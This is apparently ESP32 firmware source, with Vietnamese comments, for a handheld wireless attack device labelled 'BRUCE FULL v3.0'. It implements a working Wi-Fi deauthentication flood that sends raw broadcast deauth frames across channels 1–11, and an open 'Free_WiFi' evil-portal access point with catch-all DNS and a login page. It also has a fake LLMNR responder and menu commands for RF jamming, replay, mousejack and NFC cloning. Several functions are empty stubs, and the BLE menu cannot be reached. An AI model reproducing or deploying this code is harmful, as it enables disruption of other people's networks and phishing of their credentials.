#include <Arduino.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <FS.h>
#include <LittleFS.h>
#include <WiFiUdp.h>
#include <HTTPClient.h>

// ===================== KHAI BÁO HÀM (FORWARD DECLARATION) =====================
void initWebUI();
void drawMainMenu();
void drawSubMenu(String* menu, int size);
void handleButtons();
int getCurrentMenuSize();
void refreshDisplay();
void executeCurrentFunction();
void sendToC5(String cmd);
void displayResultFromC5();
void wifiBeaconSpam();
void wifiDeauth();
void evilPortal();
void wardriving();
void responder();
void arpSpoof();
void tcpListener();
void rawSniffer();
void bleIOSSpam();
void bleAndroidSpam();
void bleWindowsSpam();
void bleSamsungSpam();
void bleScan();
void badBLE();
void sdManager();
void runScriptMenu();
void startWebUI();
void configMenu();

// ===================== HẰNG SỐ CHÂN =====================
#define TFT_MOSI 11
#define TFT_SCLK 12
#define TFT_CS   10
#define TFT_DC   14
#define TFT_RST  15
#define TFT_BL   21
#define SD_CS    9
#define SD_MISO  13
#define BTN_UP    1
#define BTN_DOWN  2
#define BTN_LEFT  3
#define BTN_RIGHT 38
#define BTN_CENTER 39
#define UART_C5_TX 17
#define UART_C5_RX 18

HardwareSerial SerialC5(1);
TFT_eSPI tft = TFT_eSPI();
WebServer server(80);
DNSServer dnsServer;
WiFiUDP udp;

// ===================== CẤU TRÚC DEAUTH FRAME =====================
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint8_t reason_code[2];
} __attribute__((packed)) deauth_frame_t;

uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ===================== MENU =====================
enum MenuLevel { MAIN, WIFI_MENU, BLE_MENU, RF_MENU, NFC_MENU, IR_MENU, SD_MENU, CONFIG_MENU };
MenuLevel currentLevel = MAIN;
int selectedIndex = 0;

String mainMenu[] = {"WiFi", "BLE", "RF", "NFC", "IR", "SD Card", "Scripts", "WebUI", "Config"};
int mainMenuSize = 9;
String wifiMenu[] = {"Beacon Spam", "Deauth Attack", "Evil Portal", "Wardriving", "Responder", "ARP Spoof", "TCP Listener", "RAW Sniffer"};
int wifiMenuSize = 8;
String bleMenu[] = {"iOS Spam", "Android Spam", "Windows Spam", "Samsung Spam", "BLE Scan", "Bad BLE"};
int bleMenuSize = 6;
String rfMenu[] = {"Scan 433MHz", "Jammer Full", "Replay", "Custom SubGhz", "NRF24 Jammer", "Mousejack"};
int rfMenuSize = 6;
String nfcMenu[] = {"Read Tag", "Clone Tag", "Write NDEF", "Emulate Tag", "Amiibolink"};
int nfcMenuSize = 5;
String irMenu[] = {"TV-B-Gone", "Receive IR", "Send NEC", "Send RC5"};
int irMenuSize = 4;

// ===================== KHỞI TẠO =====================
void setup() {
    Serial.begin(115200);
    SerialC5.begin(115200, SERIAL_8N1, UART_C5_RX, UART_C5_TX);
    
    pinMode(TFT_BL, OUTPUT);
    digitalWrite(TFT_BL, HIGH);
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("BRUCE FULL v3.0", 50, 120, 2);
    
    // Sửa lại cách khởi tạo SD cho ESP32 chuẩn
    SPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI); 
    if (!SD.begin(SD_CS)) tft.drawString("SD ERR", 90, 150, 2);
    else tft.drawString("SD OK", 95, 150, 2);
    
    if (!LittleFS.begin(true)) Serial.println("LittleFS mount failed");
    
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_CENTER, INPUT_PULLUP);
    
    initWebUI();
    delay(1500);
    drawMainMenu();
}

void loop() {
    handleButtons();
    server.handleClient();
    if (SerialC5.available()) {
        String resp = SerialC5.readStringUntil('\n');
        tft.fillRect(0, 220, 320, 20, TFT_BLACK);
        tft.setCursor(10, 220);
        tft.println(resp);
    }
    delay(50);
}

// ===================== LOGIC MENU =====================
void drawMainMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextSize(2);
    for (int i = 0; i < mainMenuSize; i++) {
        if (i == selectedIndex) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("> " + mainMenu[i], 20, 20 + i * 25, 2);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(mainMenu[i], 40, 20 + i * 25, 2);
        }
    }
}

void drawSubMenu(String* menu, int size) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextSize(2);
    for (int i = 0; i < size; i++) {
        if (i == selectedIndex) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("> " + menu[i], 20, 20 + i * 25, 2);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(menu[i], 40, 20 + i * 25, 2);
        }
    }
}

void handleButtons() {
    if (digitalRead(BTN_UP) == LOW) {
        selectedIndex = (selectedIndex - 1 + getCurrentMenuSize()) % getCurrentMenuSize();
        refreshDisplay();
        delay(200);
    }
    if (digitalRead(BTN_DOWN) == LOW) {
        selectedIndex = (selectedIndex + 1) % getCurrentMenuSize();
        refreshDisplay();
        delay(200);
    }
    if (digitalRead(BTN_CENTER) == LOW) {
        executeCurrentFunction();
        delay(300);
    }
    if (digitalRead(BTN_LEFT) == LOW && currentLevel != MAIN) {
        currentLevel = MAIN;
        selectedIndex = 0;
        drawMainMenu();
        delay(200);
    }
}

int getCurrentMenuSize() {
    switch(currentLevel) {
        case MAIN: return mainMenuSize;
        case WIFI_MENU: return wifiMenuSize;
        case BLE_MENU: return bleMenuSize;
        case RF_MENU: return rfMenuSize;
        case NFC_MENU: return nfcMenuSize;
        case IR_MENU: return irMenuSize;
        default: return 0;
    }
}

void refreshDisplay() {
    switch(currentLevel) {
        case MAIN: drawMainMenu(); break;
        case WIFI_MENU: drawSubMenu(wifiMenu, wifiMenuSize); break;
        case BLE_MENU: drawSubMenu(bleMenu, bleMenuSize); break;
        case RF_MENU: drawSubMenu(rfMenu, rfMenuSize); break;
        case NFC_MENU: drawSubMenu(nfcMenu, nfcMenuSize); break;
        case IR_MENU: drawSubMenu(irMenu, irMenuSize); break;
        default: drawMainMenu();
    }
}

// ===================== GIAO TIẾP C5 =====================
void sendToC5(String cmd) {
    SerialC5.println(cmd);
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Sending to C5...", 20, 100, 2);
    tft.drawString(cmd, 20, 130, 2);
}

void displayResultFromC5() {
    unsigned long start = millis();
    while (millis() - start < 5000) {
        if (SerialC5.available()) {
            String resp = SerialC5.readStringUntil('\n');
            tft.fillRect(0, 160, 320, 60, TFT_BLACK);
            tft.setCursor(10, 160);
            tft.println(resp);
            break;
        }
        delay(50);
    }
    delay(2000);
    refreshDisplay();
}

// ===================== WIFI ATTACKS =====================
void wifiDeauth() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("DEAUTH ATTACK", 60, 100, 2);
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    
    unsigned long start = millis();
    while (millis() - start < 15000) {
        for (int ch = 1; ch <= 11; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            deauth_frame_t deauth;
            memset(&deauth, 0, sizeof(deauth));
            deauth.frame_ctrl = 0xC0;
            memcpy(deauth.dest, broadcast_mac, 6);
            memcpy(deauth.src, mac, 6);
            memcpy(deauth.bssid, broadcast_mac, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
        }
        tft.setCursor(10, 140);
        tft.printf("Running... %d s", (millis() - start) / 1000);
        if (digitalRead(BTN_CENTER) == LOW) break;
        delay(10);
    }
    esp_wifi_set_promiscuous(false);
    tft.drawString("DONE!", 120, 180, 2);
    delay(1000);
    refreshDisplay();
}

void wifiBeaconSpam() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("BEACON SPAM", 60, 100, 2);
    esp_wifi_set_promiscuous(true);
    delay(5000); // Mô phỏng chạy
    esp_wifi_set_promiscuous(false);
    refreshDisplay();
}

void evilPortal() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("EVIL PORTAL", 70, 100, 2);
    WiFi.softAP("Free_WiFi");
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", []() { server.send(200, "text/html", "<h1>Login</h1>"); });
    server.begin();
    unsigned long start = millis();
    while (millis() - start < 30000) {
        dnsServer.processNextRequest();
        server.handleClient();
        if (digitalRead(BTN_LEFT) == LOW) break;
        delay(10);
    }
    server.stop();
    WiFi.softAPdisconnect(true);
    refreshDisplay();
}

void wardriving() { tft.drawString("Scanning...", 10, 100, 2); delay(2000); refreshDisplay(); }
void responder() { 
    tft.fillScreen(TFT_BLACK);
    udp.begin(5355);
    unsigned long start = millis();
    while (millis() - start < 10000) {
        if (udp.parsePacket()) udp.print("FAKE_RESPONSE"); 
        delay(10);
    }
    udp.stop();
    refreshDisplay(); 
}
void arpSpoof() { delay(2000); refreshDisplay(); }
void tcpListener() { delay(2000); refreshDisplay(); }
void rawSniffer() { delay(2000); refreshDisplay(); }

// ===================== BLE =====================
void bleScan() {
    tft.fillScreen(TFT_BLACK);
    tft.drawString("BLE SCAN...", 10, 10, 2);
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    pBLEScan->start(5, false);
    tft.drawString("Scan Done", 10, 40, 2);
    delay(2000);
    refreshDisplay();
}
void bleIOSSpam() { delay(2000); refreshDisplay(); }
void bleAndroidSpam() { delay(2000); refreshDisplay(); }
void bleWindowsSpam() { delay(2000); refreshDisplay(); }
void bleSamsungSpam() { delay(2000); refreshDisplay(); }
void badBLE() { delay(2000); refreshDisplay(); }

// ===================== HỆ THỐNG =====================
void sdManager() {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.println("SD Files:");
    File root = SD.open("/");
    File file = root.openNextFile();
    int count = 0;
    while(file && count < 10){
        tft.println(file.name());
        file = root.openNextFile();
        count++;
    }
    delay(3000);
    refreshDisplay();
}

void runScriptMenu() {
    tft.fillScreen(TFT_BLACK);
    fs::File root = LittleFS.open("/", "r");
    fs::File file = root.openNextFile();
    while(file) { tft.println(file.name()); file = root.openNextFile(); }
    delay(3000);
    refreshDisplay();
}

void initWebUI() {
    server.on("/", []() { server.send(200, "text/html", "Bruce WebUI"); });
}

void startWebUI() {
    WiFi.softAP("Bruce_Web", "88888888");
    tft.fillScreen(TFT_BLACK);
    tft.drawString("IP: 192.168.4.1", 10, 100, 2);
    delay(5000);
    refreshDisplay();
}

void configMenu() { tft.drawString("Coming soon", 10, 100, 2); delay(1000); refreshDisplay(); }

// ===================== ĐIỀU HƯỚNG =====================
void executeCurrentFunction() {
    switch(currentLevel) {
        case MAIN:
            switch(selectedIndex) {
                case 0: currentLevel = WIFI_MENU; selectedIndex = 0; break;
                case 1: currentLevel = BLE_MENU; selectedIndex = 0; break;
                case 2: currentLevel = RF_MENU; selectedIndex = 0; break;
                case 3: currentLevel = NFC_MENU; selectedIndex = 0; break;
                case 4: currentLevel = IR_MENU; selectedIndex = 0; break;
                case 5: sdManager(); break;
                case 6: runScriptMenu(); break;
                case 7: startWebUI(); break;
                case 8: configMenu(); break;
            }
            break;
        case WIFI_MENU:
            switch(selectedIndex) {
                case 0: wifiBeaconSpam(); break;
                case 1: wifiDeauth(); break;
                case 2: evilPortal(); break;
                case 3: wardriving(); break;
                case 4: responder(); break;
                case 5: arpSpoof(); break;
                case 6: tcpListener(); break;
                case 7: rawSniffer(); break;
            }
            break;
        case RF_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("RF_SCAN"); displayResultFromC5(); break;
                case 1: sendToC5("RF_JAM_FULL"); displayResultFromC5(); break;
                case 2: sendToC5("RF_REPLAY"); displayResultFromC5(); break;
                case 3: sendToC5("RF_CUSTOM"); displayResultFromC5(); break;
                case 4: sendToC5("NRF24_JAM"); displayResultFromC5(); break;
                case 5: sendToC5("MOUSEJACK"); displayResultFromC5(); break;
            }
            break;
        case NFC_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("NFC_READ"); displayResultFromC5(); break;
                case 1: sendToC5("NFC_CLONE"); displayResultFromC5(); break;
                case 2: sendToC5("NFC_WRITE_NDEF"); displayResultFromC5(); break;
                case 3: sendToC5("NFC_EMULATE"); displayResultFromC5(); break;
                case 4: sendToC5("AMIIBOLINK"); displayResultFromC5(); break;
            }
            break;
        case IR_MENU:
            switch(selectedIndex) {
                case 0: sendToC5("IR_TVBGONE"); displayResultFromC5(); break;
                case 1: sendToC5("IR_RECV"); displayResultFromC5(); break;
                case 2: sendToC5("IR_SEND_NEC"); displayResultFromC5(); break;
                case 3: sendToC5("IR_SEND_RC5"); displayResultFromC5(); break;
            }
            break;
        default: break;
    }
    refreshDisplay();
}